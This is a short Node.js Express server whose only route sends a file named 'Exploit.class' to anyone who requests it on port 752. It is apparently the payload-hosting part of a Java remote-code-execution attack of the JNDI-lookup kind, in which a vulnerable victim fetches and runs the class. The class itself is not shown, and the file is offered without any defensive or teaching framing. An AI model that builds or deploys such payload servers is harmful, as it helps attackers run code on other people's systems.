const express = require('express')
const app = express()
const path = require('path')

app.get('/Exploit.class', function (req, res) {
    res.sendFile("Exploit.class", {root: path.join(__dirname)}, function (err) {
        if (err) { console.log(err) }
        else { console.log("sent file!")}
    })
})

app.listen(752)